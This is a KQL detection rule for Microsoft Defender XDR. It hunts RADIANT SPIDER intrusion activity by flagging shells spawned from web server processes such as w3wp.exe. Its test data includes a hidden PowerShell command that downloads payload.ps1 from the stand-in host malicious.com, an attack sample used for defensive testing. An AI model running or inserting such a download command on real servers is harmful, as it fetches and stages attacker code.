# Name
Radiant Spider (SilentSkimmer) Initial Access and Web Shell Activity - Suspicious Child Process Spawned by Web Server (Potential RCE)

# Description
This detection identifies the early-stage intrusion activities of the RADIANT SPIDER threat actor. It focuses on detecting remote code execution (RCE) or ViewState deserialization exploitation leading to suspicious child processes spawning from web server software (IIS, ColdFusion).

**Detection Engineer Notes:** RADIANT SPIDER employs a custom Golang loader that aggressively rewrites its configuration in memory. Because it bypasses hash-based IOC lists, network telemetry (beaconing to unknown IPs from unexpected processes like w3wp.exe) and behavioral tracking via DeviceNetworkEvents should be paired with the process creation detections above.

# References
- https://www.crowdstrike.com/adversaries/radiant-spider/
- https://www.sleuthcon.com/radiant-spider-unveiled

# Author
- M4nbat

# Socials
- https://www.linkedin.com/in/grjk83/
- @knappresearchlb

# Threats
- RADIANT SPIDER
- CL-CRI-0941
- SilentSkimmer

# MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1505.003: Server Software Component: Web Shell
- T1059.001: Command and Scripting Interpreter: PowerShell
- T1056.003: Input Capture: Web Portal Capture (Formjacking)

# Data Sources
- Microsoft Defender XDR (Advanced Hunting)
  - DeviceProcessEvents

# Query

## Query 1: Suspicious Child Process Spawned by Web Server (Potential RCE)

```kql
// Test Data Table
let DeviceProcessEvents = datatable(
    Timestamp: datetime,
    DeviceId: string,
    DeviceName: string,
    ActionType: string,
    FileName: string,
    FolderPath: string,
    SHA256: string,
    ProcessCommandLine: string,
    ProcessId: long,
    AccountName: string,
    AccountDomain: string,
    InitiatingProcessFileName: string,
    InitiatingProcessCommandLine: string,
    InitiatingProcessId: long,
    InitiatingProcessParentFileName: string
)
[
    // Case 1: Suspicious execution from IIS
    datetime(2026-02-19 10:15:30), "device-guid-1", "WebSrv01.contoso.com", "ProcessCreated", 
    "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "a5b3c2d1...", 
    "powershell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\\Windows\\Temp\\payload.ps1\"", 8832, "DefaultAppPool", "IIS APPPOOL", 
    "w3wp.exe", "w3wp.exe -ap \"DefaultAppPool\"", 5100, "svchost.exe",
    
    // Case 2: Normal execution
    datetime(2026-02-19 11:00:00), "device-guid-2", "WebSrv02.contoso.com", "ProcessCreated", 
    "csc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe", "b2c3d4e5...", 
    "csc.exe /noconfig /fullpaths @\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\...\"", 6620, "DefaultAppPool", "IIS APPPOOL", 
    "w3wp.exe", "w3wp.exe -ap \"DefaultAppPool\"", 3200, "svchost.exe"
];
// Detection Logic
DeviceProcessEvents
| where Timestamp > ago(14d)
// Filter early for known web server processes targeted by Radiant Spider
| where InitiatingProcessFileName in~ ("w3wp.exe", "jrun.exe", "coldfusion.exe", "tomcat.exe")
// Look for command interpreters or scripts spawning from the web server
| where FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe", "sh.exe", "bash.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, AccountName, AccountDomain
```
